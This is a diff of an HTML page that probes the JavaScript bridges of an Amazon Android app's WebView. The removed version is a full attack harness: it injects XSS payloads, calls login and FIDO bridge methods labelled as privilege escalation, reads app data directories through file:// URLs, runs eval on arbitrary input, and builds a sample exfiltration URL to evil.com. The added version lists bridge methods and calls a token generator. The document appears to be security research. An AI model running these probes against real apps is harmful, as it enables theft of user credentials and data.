@@ -1,473 +1,85 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Amazon Kuber JS Bridge Security Test</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            font-family: monospace;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            background: #f5f5f5;
-        }
-        .section {
-            background: white;
-            margin: 20px 0;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        .bridge {
-            background: #e3f2fd;
-            margin: 10px 0;
-            padding: 10px;
-            border-left: 4px solid #2196f3;
-        }
-        .method {
-            background: #f5f5f5;
-            margin: 5px 0;
-            padding: 5px 10px;
-            font-family: monospace;
-            cursor: pointer;
-        }
-        .method:hover {
-            background: #e0e0e0;
-        }
-        button {
-            background: #4CAF50;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            margin: 5px;
-            cursor: pointer;
-            border-radius: 4px;
-        }
-        button:hover {
-            background: #45a049;
-        }
-        .danger {
-            background: #f44336;
-        }
-        .danger:hover {
-            background: #da190b;
-        }
-        .output {
-            background: #263238;
-            color: #00ff00;
-            padding: 10px;
-            font-family: monospace;
-            margin-top: 10px;
-            white-space: pre-wrap;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        .success {
-            background: #4CAF50;
-            color: white;
-            padding: 5px;
-            margin: 5px 0;
-        }
-        .error {
-            background: #f44336;
-            color: white;
-            padding: 5px;
-            margin: 5px 0;
-        }
-        h3 {
-            margin-top: 0;
-            color: #2196f3;
-        }
-        .risk-high {
-            border-left: 4px solid #f44336;
-        }
-        .risk-critical {
-            border-left: 4px solid #ff9800;
-            background: #fff3e0;
-        }
-        .risk-medium {
-            border-left: 4px solid #ffc107;
-        }
-    </style>
+    <title>AMB Bridge Explorer</title>
 </head>
 <body>
-    <h1>🔍 Amazon Kuber JS Bridge Security Test</h1>
-    <p>Testing URL: <strong id="currentUrl"></strong></p>
-    
-    <div class="section">
-        <h2>📊 Available JS Bridges</h2>
-        <div id="bridgesList"></div>
-    </div>
-    
-    <div class="section">
-        <h2>🔬 Bridge Method Testing</h2>
-        <div id="bridgeTestControls"></div>
-        <div id="bridgeOutput" class="output"></div>
-    </div>
-    
-    <div class="section">
-        <h2>🚨 Vulnerability Tests</h2>
-        <button onclick="testXSSInjection()">Test XSS Injection</button>
-        <button onclick="testDataExfiltration()">Test Data Exfiltration</button>
-        <button onclick="testPrivilegeEscalation()">Test Privilege Escalation</button>
-        <button onclick="testFileAccess()">Test File Access</button>
-        <button onclick="testAllBridges()">Test All Bridges</button>
-        <button onclick="clearOutput()">Clear Output</button>
-    </div>
-    
-    <div class="section">
-        <h2>📝 Manual Bridge Testing</h2>
-        <input type="text" id="bridgeName" placeholder="Bridge name (e.g., MAPAndroidJSBridge)" style="width: 300px; padding: 5px;">
-        <input type="text" id="methodName" placeholder="Method name" style="width: 300px; padding: 5px;">
-        <input type="text" id="methodArgs" placeholder="Arguments (comma separated)" style="width: 300px; padding: 5px;">
-        <button onclick="callBridgeMethod()">Call Method</button>
-    </div>
-    
-    <div class="section">
-        <h2>💻 Custom JavaScript</h2>
-        <textarea id="customJS" rows="5" style="width: 100%; font-family: monospace;" placeholder="Enter custom JavaScript to execute..."></textarea>
-        <button onclick="executeCustomJS()">Execute</button>
-    </div>
+    <h1>AMB Bridge Discovery</h1>
+    <div id="output" style="font-family: monospace; white-space: pre-wrap;"></div>
     
     <script>
-        // Store discovered bridges
-        let discoveredBridges = [];
-        
-        // Helper to add output
-        function addOutput(text, type = 'info') {
-            const output = document.getElementById('bridgeOutput');
-            const timestamp = new Date().toLocaleTimeString();
-            const className = type === 'error' ? 'error' : (type === 'success' ? 'success' : '');
-            output.innerHTML += `<div class="${className}">[${timestamp}] ${text}</div>`;
-            output.scrollTop = output.scrollHeight;
+        function log(msg) {
+            const output = document.getElementById('output');
+            output.innerHTML += msg + '<br>';
+            console.log(msg);
         }
         
-        // Clear output
-        function clearOutput() {
-            document.getElementById('bridgeOutput').innerHTML = '';
-        }
-        
-        // Discover all available bridges
-        function discoverBridges() {
-            addOutput('🔍 Discovering available JS bridges...');
-            const bridges = {};
+        // Check for amb_bridge
+        if (window.amb_bridge) {
+            log('✅ Found window.amb_bridge');
+            log('Type: ' + typeof window.amb_bridge);
             
-            // Check for known bridge names
-            const knownBridges = [
-                '_cordovaNative', 'amb_bridge', 'smash', 'webclient', 
-                'webclient_progress', 'appErrorWebAppInterface',
-                'FidoAuthenticatorJSBridge', 'MAPAndroidJSBridge',
-                'webclient_latencyinformation', 'webclient_fbtracker'
-            ];
-            
-            knownBridges.forEach(bridgeName => {
+            // List all methods/properties
+            log('\n--- Methods and Properties ---');
+            for (let prop in window.amb_bridge) {
                 try {
-                    if (window[bridgeName]) {
-                        bridges[bridgeName] = window[bridgeName];
-                        addOutput(`✅ Found bridge: ${bridgeName}`, 'success');
-                    } else {
-                        addOutput(`❌ Bridge not found: ${bridgeName}`, 'error');
-                    }
-                } catch(e) {
-                    // Bridge exists but might be protected
-                    try {
-                        if (typeof window[bridgeName] !== 'undefined') {
-                            bridges[bridgeName] = window[bridgeName];
-                            addOutput(`⚠️ Bridge exists but may be protected: ${bridgeName}`, 'success');
-                        }
-                    } catch(e2) {}
-                }
-            });
-            
-            // Try to enumerate all properties
-            try {
-                for (let prop in window) {
-                    if (prop.toLowerCase().indexOf('bridge') !== -1 || 
-                        prop.toLowerCase().indexOf('native') !== -1 ||
-                        prop.toLowerCase().indexOf('cordova') !== -1 ||
-                        prop.toLowerCase().indexOf('smash') !== -1) {
-                        if (!bridges[prop]) {
-                            addOutput(`🔍 Found potential bridge: ${prop}`);
-                            bridges[prop] = window[prop];
-                        }
-                    }
-                }
-            } catch(e) {}
-            
-            discoveredBridges = Object.keys(bridges);
-            displayBridges(bridges);
-            return bridges;
-        }
-        
-        // Display discovered bridges with their methods
-        function displayBridges(bridges) {
-            const container = document.getElementById('bridgesList');
-            container.innerHTML = '';
-            
-            Object.keys(bridges).forEach(bridgeName => {
-                const bridge = bridges[bridgeName];
-                const riskLevel = getBridgeRiskLevel(bridgeName);
-                const div = document.createElement('div');
-                div.className = `bridge ${riskLevel}`;
-                
-                div.innerHTML = `
-                    <strong>${bridgeName}</strong>
-                    <div id="methods-${bridgeName}"></div>
-                `;
-                container.appendChild(div);
-                
-                // Try to enumerate methods
-                const methodsContainer = document.getElementById(`methods-${bridgeName}`);
-                try {
-                    const methods = Object.getOwnPropertyNames(Object.getPrototypeOf(bridge));
-                    if (methods.length > 0) {
-                        methods.forEach(method => {
-                            if (method !== 'constructor') {
-                                const methodDiv = document.createElement('div');
-                                methodDiv.className = 'method';
-                                methodDiv.innerHTML = `  • ${method}()`;
-                                methodDiv.onclick = () => testBridgeMethod(bridgeName, method);
-                                methodsContainer.appendChild(methodDiv);
-                            }
-                        });
-                    } else {
-                        methodsContainer.innerHTML = '<em>Methods cannot be enumerated</em>';
-                    }
-                } catch(e) {
-                    methodsContainer.innerHTML = '<em>Methods cannot be enumerated</em>';
-                }
-            });
-        }
-        
-        // Get risk level for bridge
-        function getBridgeRiskLevel(bridgeName) {
-            if (bridgeName.indexOf('MAP') !== -1 || bridgeName.indexOf('Fido') !== -1) {
-                return 'risk-critical';
-            }
-            if (bridgeName.indexOf('webclient') !== -1 || bridgeName.indexOf('amb') !== -1) {
-                return 'risk-high';
-            }
-            if (bridgeName.indexOf('smash') !== -1 || bridgeName.indexOf('cordova') !== -1) {
-                return 'risk-high';
-            }
-            return 'risk-medium';
-        }
-        
-        // Test a specific bridge method
-        function testBridgeMethod(bridgeName, methodName) {
-            addOutput(`🧪 Testing ${bridgeName}.${methodName}()...`);
-            try {
-                const bridge = window[bridgeName];
-                if (bridge && typeof bridge[methodName] === 'function') {
-                    const result = bridge[methodName]();
-                    addOutput(`✅ ${bridgeName}.${methodName}() executed`, 'success');
-                    addOutput(`   Result: ${JSON.stringify(result, null, 2)}`);
-                } else {
-                    addOutput(`❌ ${bridgeName}.${methodName}() not found or not callable`, 'error');
-                }
-            } catch(e) {
-                addOutput(`❌ Error: ${e.message}`, 'error');
-            }
-        }
-        
-        // Test all bridges
-        function testAllBridges() {
-            addOutput('🚀 Testing all bridges...');
-            Object.keys(discoveredBridges).forEach(bridgeName => {
-                try {
-                    const bridge = window[bridgeName];
-                    addOutput(`\n📱 Testing ${bridgeName}:`);
+                    const value = window.amb_bridge[prop];
+                    log(`${prop}: ${typeof value}`);
                     
-                    // Try common methods
-                    const commonMethods = ['exec', 'send', 'navigate', 'initialize', 
-                                          'getCurrentAppInfo', 'handleMessage'];
-                    
-                    commonMethods.forEach(method => {
-                        if (bridge && typeof bridge[method] === 'function') {
-                            try {
-                                const result = bridge[method]();
-                                addOutput(`  ✅ ${method}() → ${JSON.stringify(result)}`, 'success');
-                            } catch(e) {
-                                addOutput(`  ⚠️ ${method}() → ${e.message}`);
-                            }
-                        }
-                    });
-                } catch(e) {}
-            });
-        }
-        
-        // Test XSS injection through bridges
-        function testXSSInjection() {
-            addOutput('🚨 Testing XSS injection vectors...');
-            
-            const xssPayloads = [
-                '<script>alert("XSS")</script>',
-                'javascript:alert(document.cookie)',
-                '"><script>alert("XSS")</script>',
-                '"><img src=x onerror=alert(1)>'
-            ];
-            
-            xssPayloads.forEach((payload, i) => {
-                addOutput(`Test ${i+1}: ${payload}`);
-                
-                // Try to inject through various bridges
-                if (window.webclient && window.webclient.navigate) {
-                    try {
-                        window.webclient.navigate(payload);
-                        addOutput(`  ⚠️ webclient.navigate() executed with payload!`, 'error');
-                    } catch(e) {}
-                }
-                
-                if (window.amb_bridge && window.amb_bridge.handleMessage) {
-                    try {
-                        window.amb_bridge.handleMessage(payload);
-                        addOutput(`  ⚠️ amb_bridge.handleMessage() executed with payload!`, 'error');
-                    } catch(e) {}
-                }
-            });
-        }
-        
-        // Test data exfiltration
-        function testDataExfiltration() {
-            addOutput('🚨 Testing data exfiltration possibilities...');
-            
-            // Try to steal sensitive data
-            const sensitiveDataTests = [
-                { bridge: 'MAPAndroidJSBridge', method: 'getCurrentAppInfo' },
-                { bridge: 'MAPAndroidJSBridge', method: 'getCustomerInformationHint' },
-                { bridge: 'FidoAuthenticatorJSBridge', method: 'isAuthenticatorCredentialAvailable' },
-                { bridge: 'webclient', method: 'getRealClickTime' }
-            ];
-            
-            sensitiveDataTests.forEach(test => {
-                try {
-                    const bridge = window[test.bridge];
-                    if (bridge && typeof bridge[test.method] === 'function') {
-                        const result = bridge[test.method]();
-                        addOutput(`⚠️ SUCCESS: ${test.bridge}.${test.method}() → ${JSON.stringify(result)}`, 'error');
-                        
-                        // Simulate exfiltration
-                        addOutput(`   📤 Data could be exfiltrated to: https://evil.com/steal?data=${encodeURIComponent(JSON.stringify(result))}`);
-                    } else {
-                        addOutput(`❌ ${test.bridge}.${test.method}() not available`);
-                    }
-                } catch(e) {}
-            });
-        }
-        
-        // Test privilege escalation
-        function testPrivilegeEscalation() {
-            addOutput('🚨 Testing privilege escalation vectors...');
-            
-            const privEscTests = [
-                { bridge: 'MAPAndroidJSBridge', method: 'upgradeToken' },
-                { bridge: 'MAPAndroidJSBridge', method: 'switchActor' },
-                { bridge: 'FidoAuthenticatorJSBridge', method: 'createAuthenticatorCredential' },
-                { bridge: 'smash', method: 'initialize' }
-            ];
-            
-            privEscTests.forEach(test => {
-                try {
-                    const bridge = window[test.bridge];
-                    if (bridge && typeof bridge[test.method] === 'function') {
-                        const result = bridge[test.method]();
-                        addOutput(`⚠️ CRITICAL: ${test.bridge}.${test.method}() executed!`, 'error');
-                        addOutput(`   Result: ${JSON.stringify(result)}`);
+                    // If it's a function, try calling it (carefully)
+                    if (typeof value === 'function') {
+                        log(`  → Function: ${prop}`);
+                        // Try to get function signature
+                        log(`  → ${prop}.toString(): ${value.toString().substring(0, 100)}`);
                     }
                 } catch(e) {
-                    addOutput(`❌ ${test.bridge}.${test.method}() → ${e.message}`);
+                    log(`  Error accessing ${prop}: ${e.message}`);
                 }
-            });
-        }
-        
-        // Test file access
-        function testFileAccess() {
-            addOutput('🚨 Testing file system access...');
+            }
             
-            // Try to access local files
-            const fileTests = [
-                'file:///data/data/com.amazon.mShop/shared_prefs/',
-                'file:///data/data/com.amazon.mShop/databases/',
-                'file:///data/data/com.amazon.mShop/files/'
+            // Try to call generateSecureRandomToken
+            if (window.amb_bridge.generateSecureRandomToken) {
+                log('\n--- Testing generateSecureRandomToken ---');
+                try {
+                    const token = window.amb_bridge.generateSecureRandomToken();
+                    log(`Token generated: ${token}`);
+                } catch(e) {
+                    log(`Error: ${e.message}`);
+                }
+            }
+            
+            // Try other common method names
+            const commonMethods = [
+                'getAuthToken', 'setAuthToken', 'getSessionId', 
+                'getDeviceInfo', 'getUserInfo', 'getAppVersion',
+                'getMetrics', 'sendEvent', 'logEvent', 'track',
+                'getWeblab', 'isWeblabEnabled', 'getTreatment'
             ];
             
-            fileTests.forEach(filePath => {
-                addOutput(`Attempting to access: ${filePath}`);
-                if (window.webclient && window.webclient.navigate) {
-                    try {
-                        window.webclient.navigate(filePath);
-                        addOutput(`  ⚠️ webclient.navigate() accessed file!`, 'error');
-                    } catch(e) {}
+            log('\n--- Checking for common methods ---');
+            for (const method of commonMethods) {
+                if (window.amb_bridge[method]) {
+                    log(`✅ Found: ${method}`);
                 }
-            });
-        }
-        
-        // Call arbitrary bridge method
-        function callBridgeMethod() {
-            const bridgeName = document.getElementById('bridgeName').value;
-            const methodName = document.getElementById('methodName').value;
-            const argsStr = document.getElementById('methodArgs').value;
-            
-            if (!bridgeName || !methodName) {
-                addOutput('Please enter bridge name and method name', 'error');
-                return;
             }
             
-            try {
-                const bridge = window[bridgeName];
-                if (!bridge) {
-                    addOutput(`Bridge '${bridgeName}' not found`, 'error');
-                    return;
+        } else {
+            log('❌ window.amb_bridge not found');
+            log('Checking for other bridge names...');
+            
+            // Check for other common bridge names
+            const bridgeNames = ['amb_bridge', 'Ambridge', 'bridge', 'AndroidBridge', 'NativeBridge', 'AmazonBridge'];
+            for (const name of bridgeNames) {
+                if (window[name]) {
+                    log(`✅ Found window.${name}`);
                 }
-                
-                if (typeof bridge[methodName] !== 'function') {
-                    addOutput(`Method '${methodName}' not found on bridge '${bridgeName}'`, 'error');
-                    return;
-                }
-                
-                let args = [];
-                if (argsStr) {
-                    args = argsStr.split(',').map(arg => arg.trim());
-                }
-                
-                addOutput(`Calling ${bridgeName}.${methodName}(${args.join(', ')})...`);
-                const result = bridge[methodName].apply(bridge, args);
-                addOutput(`✅ Result: ${JSON.stringify(result, null, 2)}`, 'success');
-            } catch(e) {
-                addOutput(`❌ Error: ${e.message}`, 'error');
             }
         }
         
-        // Execute custom JavaScript
-        function executeCustomJS() {
-            const customJS = document.getElementById('customJS').value;
-            if (!customJS) {
-                addOutput('Please enter JavaScript to execute', 'error');
-                return;
-            }
-            
-            addOutput(`Executing custom JS: ${customJS}`);
-            try {
-                const result = eval(customJS);
-                addOutput(`✅ Result: ${JSON.stringify(result, null, 2)}`, 'success');
-            } catch(e) {
-                addOutput(`❌ Error: ${e.message}`, 'error');
-            }
+        // Also check for the AMBWebBridge class directly
+        if (window.AMBWebBridge) {
+            log('\n✅ Found window.AMBWebBridge');
         }
-        
-        // Initialize on page load
-        window.onload = function() {
-            document.getElementById('currentUrl').textContent = window.location.href;
-            addOutput('✅ Page loaded, discovering bridges...');
-            setTimeout(() => {
-                discoverBridges();
-            }, 1000);
-        };
-        
-        // Auto-refresh bridges every 5 seconds
-        setInterval(() => {
-            discoverBridges();
-        }, 5000);
     </script>
 </body>
 </html>
